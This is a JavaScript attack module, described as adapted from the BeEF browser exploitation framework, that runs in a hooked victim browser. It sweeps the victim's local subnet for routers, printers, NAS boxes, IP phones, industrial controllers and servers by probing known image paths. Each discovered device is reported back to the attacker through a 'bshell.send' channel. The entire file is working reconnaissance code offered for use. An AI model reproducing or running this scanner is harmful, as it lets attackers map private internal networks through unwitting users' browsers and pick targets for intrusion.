function(bshell) {
    /*
     * Ripped from BeeF and made async + other minor fixes and additions
     */

    // ipRange in the form of 192.168.0.1-192.168.0.254: only fourth octet will be iterated.
    var ipRange = '192.168.0.1-192.168.0.254';

    var urls = new Array(
	// in the form of: "Dev/App Name","Default Port","Use Multiple Ports if specified","IMG url","IMG width","IMG height"
	new Array("Apache",":80",false,"/icons/apache_pb.gif",259,32),
	new Array("Apache 2.x",":80",false,"/icons/apache_pb2.gif",259,32),
	new Array("Microsoft IIS 7.x",":80",true,"/welcome.png",571,411),
	new Array("Microsoft IIS",":80",false,"/pagerror.gif",36,48),
	new Array("QNAP NAS",":8080",false,"/ajax_obj/img/running.gif",16,16),
	new Array("QNAP NAS",":8080",false,"/ajax_obj/images/qnap_logo_w.gif",115,21),
	new Array("Belkin Router",":80",false,"/images/title_2.gif",321,28),
	new Array("Billion Router",":80",false,"/customized/logo.gif",318,69),
	new Array("Billion Router",":80",false,"/customized/logo.gif",224,55),
	new Array("SMC Networks",":80",false,"/images/logo.gif",133,59),
	new Array("Linksys NAS",":80",false,"/Admin_top.JPG",750,52),
	new Array("Linksys NAS",":80",false,"/logo.jpg",194,52),
	new Array("Linksys Network Camera",":80",false,"/welcome.jpg",146,250),
	new Array("Linksys Wireless-G Camera",":80",false,"/header.gif",750,97),
	new Array("Cisco IP Phone",":80",false,"/Images/Logo",120,66),
	new Array("Snom Phone",":80",false,"/img/snom_logo.png",168,62),
	new Array("Dell Laser Printer",":80",false,"/ews/images/delllogo.gif",100,100),
	new Array("Brother Printer",":80",false,"/pbio/brother.gif",144,52),
	new Array("HP LaserJet Printer",":80",false,"/hp/device/images/logo.gif",42,27),
	new Array("HP LaserJet Printer",":80",false,"/hp/device/images/hp_invent_logo.gif",160,52),
	new Array("JBoss Application server",":8080",true,"/images/logo.gif",226,105),
	new Array("Siemens Simatic",":80",false,"/Images/Siemens_Firmenmarke.gif",115,76),
	new Array("APC InfraStruXure Manager",":80",false,"/images/Xlogo_Layer-1.gif",342,327),
	new Array("Barracuda Spam/Virus Firewall",":8000",true,"/images/powered_by.gif",211,26),
	new Array("TwonkyMedia Server",":9000",false,"/images/TwonkyMediaServer_logo.jpg",150,82),
	new Array("Alt-N MDaemon World Client",":3000",false,"/LookOut/biglogo.gif",342,98),
	new Array("VLC Media Player",":8080",false,"/images/white_cross_small.png",9,9),
	new Array("VMware ESXi Server",":80",false,"/background.jpeg",1,1100),
	new Array("Microsoft Remote Web Workplace",":80",false,"/Remote/images/submit.gif",31,31),
	new Array("XAMPP",":80",false,"/xampp/img/xampp-logo-new.gif",200,59),
	new Array("Xerox Printer",":80",false,"/printbut.gif",30,30),
	new Array("Konica Minolta Printer",":80",false,"/G27_light.gif",206,26),
	new Array("Epson Printer",":80",false,"/cyandot.gif",1,1),
	new Array("HP Printer",":80",false,"/hp/device/images/hp_invent_logo.gif",160,52),
	new Array("Syncrify",":5800",false,"/images/468x60.gif",468,60),
	new Array("Winamp Web Interface",":80",false,"/img?image=121",30,30),
	new Array("Zenoss Core",":8080",false,"/zport/dmd/favicon.ico",16,16),
	new Array("BeEF",":3000",false,"/ui/media/images/beef.png",200,149),
	new Array("BeEF (PHP)",":80",false,"/beef/images/beef.gif",32,32),
	new Array("Wordpress",":80",false,"/wp-includes/images/wpmini-blue.png",16,16),
	new Array("ScrewTurn Wiki", ":80",true,"/Themes/Default-v2/Images/ExternalLink.gif",11,10),
	new Array("Glassfish Server",":4848",false,"/theme/com/sun/webui/jsf/suntheme/images/login/gradlogsides.jpg", 1, 200)
	,new Array("Thomson TG585 DSL Router", ":80", false, "/images/tbox__xl.gif", 80,80)
    );

    var ips = [];
    var ports = [80, 443];
    var ipBounds = ipRange.split('-');
    var lowerBound = ipBounds[0].split('.')[3];
    var upperBound = ipBounds[1].split('.')[3];

    for(var i=lowerBound; i<=upperBound; i++){
        ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
        ips.push(ipToTest);
    }

    var dom = document.body;
    var self = this;
    this.onload = function() { 
	if (this.width == urls[this.id][4] && this.height == urls[this.id][5]) {
	    dom.removeChild(this); 
	    bshell.send({discovered: '"'+escape(urls[this.id][0])+'"', url: '"'+escape(this.src)+'"'});
	}
    };

    this.onerror = function() {
	dom.removeChild(this);
    };

    this.tryit = function(id,url,ip,port) {
	setTimeout(function() {
            var img = new Image;
	    img.id=id;
	    if(typeof port != "undefined") {
                img.src = "http"+(port == 443 ? "s":"")+"://"+ip+(port != 443 ? ":"+port+url[3] : "");
	    } else
		img.src = "http://"+ip+url[1]+url[3];
            img.onload = self.onload;
	    img.onerror = self.onerror;
            dom.appendChild(img);
	}, id * 100);
    };

    // for each ip
    for(var i=0; i < ips.length; i++) {
	// for each url
	for(var u=0; u < urls.length; u++) {
            if(!urls[u][2] && ports != null)
	    { // use default port
		this.tryit(u, urls[u],ips[i]);
            } 
	    else
	    { // iterate to all the specified ports
                for(var p=0; p<ports.length; p++) {
		    this.tryit(u, urls[u],ips[i], ports[p]);
                }
            }
	}
    }
    return {status: 'scan initiated'};
}(bshell);